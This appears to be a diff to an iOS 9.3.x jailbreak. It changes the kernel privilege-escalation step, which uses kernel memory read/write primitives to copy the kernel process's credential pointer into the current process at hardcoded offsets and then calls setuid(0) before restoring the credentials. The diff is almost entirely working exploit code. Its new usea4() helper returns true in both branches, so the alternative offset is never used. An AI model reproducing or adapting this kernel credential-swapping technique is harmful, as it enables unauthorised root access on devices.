@@ -160,6 +160,15 @@ bool exists(char* path) {
 	return ret;
 }
 
+bool usea4(void) {
+	//don't use hardcoded offsets, write a patchfinder later
+	if ([[NSArray arrayWithObjects:@"9.3.6",@"9.3.5",@"9.3.4",@"9.3.3",@"9.3.2",@"9.3.1",@"9.3", nil] containsObject:[[UIDevice currentDevice] systemVersion]]) {
+		return true;
+	} else {
+		return true;
+	}
+}
+
 /*
  *  BEGIN ADVANCED BORROWING FROM REALKJCMEMBER
  */
@@ -698,17 +707,33 @@ bool patch_kernel(void) {
 	 *  TODO: don't hardcode 0xa4, ideally write patchfinder code for it
 	 */
 	
-	uint32_t kern_ucred = kread_uint32(kernproc + 0xa4);
-	lprintf("uint32_t kern_ucred = 0x%08x;", kern_ucred);
-	
-	ourcred = kread_uint32(myproc + 0xa4);
-	lprintf("uint32_t ourcred = 0x%08x;", ourcred);
-
-	/*
-	 *  i am (g)root
-	 */
-	kwrite_uint32(myproc + 0xa4, kern_ucred);
-	setuid(0);
+	uint32_t kern_ucred;
+	if (usea4()) {
+		printf("using 0xa4 hardcoded offset");
+		kern_ucred = kread_uint32(kernproc + 0xa4);
+		lprintf("uint32_t kern_ucred = 0x%08x;", kern_ucred);
+		ourcred = kread_uint32(myproc + 0xa4);
+		lprintf("uint32_t ourcred = 0x%08x;", ourcred);
+		
+		/*
+		 *  i am (g)root
+		 */
+		kwrite_uint32(myproc + 0xa4, kern_ucred);
+		setuid(0);
+		
+	} else {
+		printf("using 0x98 hardcoded offset");
+		kern_ucred = kread_uint32(kernproc + 0x98);
+		lprintf("uint32_t kern_ucred = 0x%08x;", kern_ucred);
+		ourcred = kread_uint32(myproc + 0x98);
+		lprintf("uint32_t ourcred = 0x%08x;", ourcred);
+		
+		/*
+		 *  i am (g)root
+		 */
+		kwrite_uint32(myproc + 0x98, kern_ucred);
+		setuid(0);
+	}
 	
 	return ret;
 }
@@ -1271,7 +1296,11 @@ bool jailbreak(void) {
 	 *  note: todo: save original uid in case unsandboxed root daemon
 	 */
 	
-	kwrite_uint32(myproc + 0xa4, ourcred);
+	if (usea4()) {
+		kwrite_uint32(myproc + 0xa4, ourcred);
+	} else {
+		kwrite_uint32(myproc + 0x98, ourcred);
+	}
 	setuid(501);
 	
 #if BTSERVER_USED
